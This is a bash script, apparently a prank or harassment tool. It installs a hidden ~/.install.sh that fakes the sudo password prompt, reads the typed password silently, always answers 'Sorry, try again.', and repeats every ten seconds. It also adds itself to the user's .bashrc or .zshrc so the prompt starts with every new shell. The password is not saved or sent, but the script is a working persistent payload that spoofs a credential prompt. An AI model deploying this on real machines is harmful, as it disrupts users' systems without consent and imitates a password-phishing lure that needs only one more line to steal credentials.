#! /usr/bin/env bash

USER=$(whoami)

prompt_sudo() {
    while true; do
        echo -n "[sudo] password for $USER: "

        stty -echo
        read -r password
        stty echo

        echo ""

        echo "Sorry, try again."
    done
}

add_to_startup() {
    if [[ "$SHELL" == */bash ]]; then
        config_file="$HOME/.bashrc"
    elif [[ "$SHELL" == */zsh ]]; then
        config_file="$HOME/.zshrc"
    else
        config_file="$HOME/.bashrc"
    fi

    # Line to add to the shell config file
    startup_line="~/.install.sh &"

    if ! grep -Fxq "$startup_line" "$config_file"; then
        echo "$startup_line" >> "$config_file"
        echo "Added sudo prompt script to $config_file"
    else
        echo "Sudo prompt script is already in $config_file"
    fi
}

install_script() {
    sudo_prompt_script="$HOME/.install.sh"

    if [[ ! -f "$sudo_prompt_script" ]]; then
        cat > "$sudo_prompt_script" <<EOL
#! /usr/bin/env bash
# Get the current user
USER=\$(whoami)

# Function to simulate the sudo prompt
while true; do
    # Prompt for password
    echo -n "[sudo] password for \$USER: "

    # Turn off echo to hide input, read the password (will always fail)
    stty -echo
    read -r password
    stty echo

    # Add a new line (to simulate what happens when pressing enter)
    echo ""

    # Always show failure message
    echo "Sorry, try again."

    # Sleep for 10 seconds before asking again
    sleep 10
done
EOL

        chmod +x "$sudo_prompt_script"
        echo "Installed sudo prompt script at $sudo_prompt_script"
    else
        echo "Sudo prompt script already exists at $sudo_prompt_script"
    fi
}

install_script
add_to_startup

prompt_sudo
